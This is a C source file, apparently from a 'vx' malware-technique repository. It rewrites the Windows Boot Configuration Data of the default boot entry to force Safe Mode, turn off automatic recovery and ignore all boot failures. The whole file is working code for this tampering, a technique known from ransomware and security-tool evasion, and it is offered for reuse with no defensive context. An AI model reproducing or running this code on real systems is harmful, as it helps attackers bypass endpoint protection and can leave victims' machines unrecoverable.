/**
* @file			main.c
* @author		Paul L. (@am0nsec)
* @version		1.0
* @brief        Modify boot configuration to enable safe mode, disable recovery and ignore all failure.
* @details
* @link			https://github.com/am0nsec/vx
* @copyright	This project has been released under the GNU Public License v3 license.
*/
#include <Windows.h>
#include "bcdutil.h"

INT main() {
	// 1. Acquire BCD synchronisation mutant 
	HANDLE hMutant = INVALID_HANDLE_VALUE;
	EXIT_ON_ERROR(BcdAcquireSyncMutant(&hMutant));

	// 2. Get handle to the windows default boot object
	HKEY hWindowsBootMgrDefaultObj = INVALID_HANDLE_VALUE;
	BcdGetDefaultBootObject(&hWindowsBootMgrDefaultObj);

	// 3. Open handle to the Elements of the default boot object
	HKEY hWindowsBootMgrDefaultObjElements = INVALID_HANDLE_VALUE;
	EXIT_ON_ERROR(BcdOpenKeyByName(
		BCD_ELEMENTS,
		(READ_CONTROL | WRITE_DAC | KEY_NOTIFY | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS),
		&hWindowsBootMgrDefaultObj,
		&hWindowsBootMgrDefaultObjElements
	));

	// 4. Enable SafeBoot
	BYTE SafeBootData[0x08] = { 0x00 };
	BcdModifyBootConfiguration(
		&hWindowsBootMgrDefaultObjElements,
		BCDE_OSLOADER_TYPE_SAFEBOOT,
		SafeBootData,
		0x08
	);

	// 5. Disable recovery mode
	BYTE RecoveryEnabled[0x01] = { 0x00 };
	BcdModifyBootConfiguration(
		&hWindowsBootMgrDefaultObjElements,
		BCDE_LIBRARY_TYPE_AUTO_RECOVERY_ENABLED,
		RecoveryEnabled,
		0x01
	);

	// 5. Update boot policy
	BYTE BootpolicyData[0x08] = { 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
	BcdModifyBootConfiguration(
		&hWindowsBootMgrDefaultObjElements,
		BCDE_OSLOADER_TYPE_BOOT_STATUS_POLICY,
		BootpolicyData,
		0x08
	);

	// Cleanup and exit
	NtClose(hMutant);
	NtClose(hWindowsBootMgrDefaultObj);
	NtClose(hWindowsBootMgrDefaultObjElements);
	return EXIT_SUCCESS;
}